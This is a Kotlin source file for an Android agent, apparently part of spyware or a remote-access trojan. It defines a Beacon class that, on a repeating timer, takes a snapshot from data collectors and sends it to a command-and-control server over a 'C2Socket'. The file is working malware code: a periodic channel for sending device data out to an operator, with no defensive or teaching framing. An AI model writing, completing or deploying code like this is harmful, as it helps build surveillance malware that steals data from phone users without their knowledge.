package ai.bixtx.agent

import ai.bixtx.agent.collectors.DataCollectors
import android.os.Handler
import android.os.Looper

class Beacon(
    private val socket: C2Socket,
    private val collectors: DataCollectors,
) {
    private val handler = Handler(Looper.getMainLooper())
    private var running = false

    private val tick = object : Runnable {
        override fun run() {
            if (!running) return
            val snap = collectors.snapshot()
            socket.send("BEACON", snap)
            handler.postDelayed(this, Config.BEACON_INTERVAL)
        }
    }

    fun start() {
        running = true
        handler.post(tick)
    }

    fun stop() {
        running = false
        handler.removeCallbacks(tick)
    }
}
